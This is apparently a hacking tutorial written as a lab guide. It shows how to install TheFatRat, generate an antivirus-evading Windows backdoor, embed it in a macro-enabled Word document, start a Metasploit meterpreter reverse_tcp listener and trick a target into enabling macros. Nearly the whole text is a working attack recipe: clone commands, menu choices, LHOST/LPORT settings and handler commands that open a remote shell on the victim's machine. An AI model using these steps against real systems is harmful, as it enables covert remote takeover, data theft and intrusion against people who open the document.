# Hacking Windows with Malicious Office Document using TheFatRat

TheFatRat is an exploiting tool which compiles a malware with famous payload, and then the compiled malware can be executed on Linux, Windows, Mac and Android. TheFatRat Provides An Easy way to create Backdoors and Payload which can bypass most anti-virus.

Official Repository: https://github.com/Screetsec/TheFatRat

# Objectives

How to use an office document to exploit a windows machine.

# Requisites

Windows Server 2016/2012 virtual machine.

Kali linux virtual machine.


# Set up TheFatRat

TheFatRat provides an easy way to create backdoors and payloads which can bypass most anti-virus systems.


# Setting up

1:-> Go to your Kali machine and open the Terminal.

2:-> Navigate to the /opt/ folder.

$=>  cd /opt

3:-> Clone the original github repository from FatRat:

$=> git clone https://github.com/Screetsec/TheFatRat.git

4:-> Change the folder permissions:

$=> chmod -R 755 /opt/TheFatRat/

5:-> Go to the TheFatRat folder:

$=> cd TheFatRat/

6:-> Execute the bash file (setup.sh) to begin the installation:

$=> ./setup.sh

An Updating Kali Repo xterm window will popup will be shown:



# Make a Backdoor File

After the installation is complete, in the Terminal, type fatrat and hit enter.



When FatRat launches, starts to verify the installed dependencies, you will get multiple prompts, just type Enter to continue.



7:-> On the FatRat menu, choose [06] Create Fud Backdoor 1000% with PwnWindws [Excelent] by typing 6.

8:-> PwnWinds menu appears as shown above, choose the [3] Create exe file with apache + Powershell (FUD 100%) by typing 3 in the menu.

8:-> Set the LHOST IP to your Kali IP; LPORT to 4444 and the output to payload .

9:-> Next, chose [3] windows/meterpreter/reverse_tcp by typing 3.

10:-> If everything works, fatrat will generate a payload.exe file located on /root/Fatrat_Generated/ as shown below:

$   Backdoor Saved To : /root/Fatrat_Generated/payload.exe





# Make a Malicious Word File



11:-> Go back to the main menu by choosing [9] Back to menu.

12:-> On the main menu, choose the [07] Create Backdoor For Office with Microsploit

13:-> On the Microsploit menu, choose [2] The Microsoft Office Macro on Windows by typing 2.



# The next configurations will be:

14:-> LHOST IP: [Your Kali IP]

15:-> LPORT: 4444

16:-> Enter the base name for output files: EvilDoc

17:-> Enter the message for the document body: you have been PWNED :)

18:-> The next prompt will ask if you want to use a custom exe to file backdoor. Choose y for yes.

19:-> Specify the exactly path to your payload.exe that you generated on the beginings of this lab: /root/Fatrat_Generated/payload.exe

20:-> On the Payload Option, choose the [3] windows/meterpreter/reverse_tcp by typing 3. Navigate to output folder of FatRat to you will 
see the generated Word file.





# Set Up a Listener



21:-> Open another Terminal window and launch metasploit by typing: msfconsole.

22:-> Select the multi/handler:

23:-> use multi/handler

24:-> Set the payload to meterpreter/reverse_tcp:

25:-> set payload windows/meterpreter/reverse_tcp

26:-> Set the LHOST to your Kali IP and LPORT to 4444:

27:-> set LHOST 10.0.2.42

28:-> set LPORT 4444



29:-> Type run to start the listener:

$ run



30:-> Share the Malicious Doc File



31:-> Open the Malicious doc



Open the downloads folder and click the MS Word file.

MS Word open the file in Protected View. Click Enable Editing as shown below:

If you got the SECURITY WARNING because of the Macros, click on Enable Content.

Now Switch back to the Kali, if everything works, you will find that have a Meterpreter session open in the Metasploit terminal.



Now you can view the exploited system details and so on. Informally you can call this action 'profit' :)













____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________


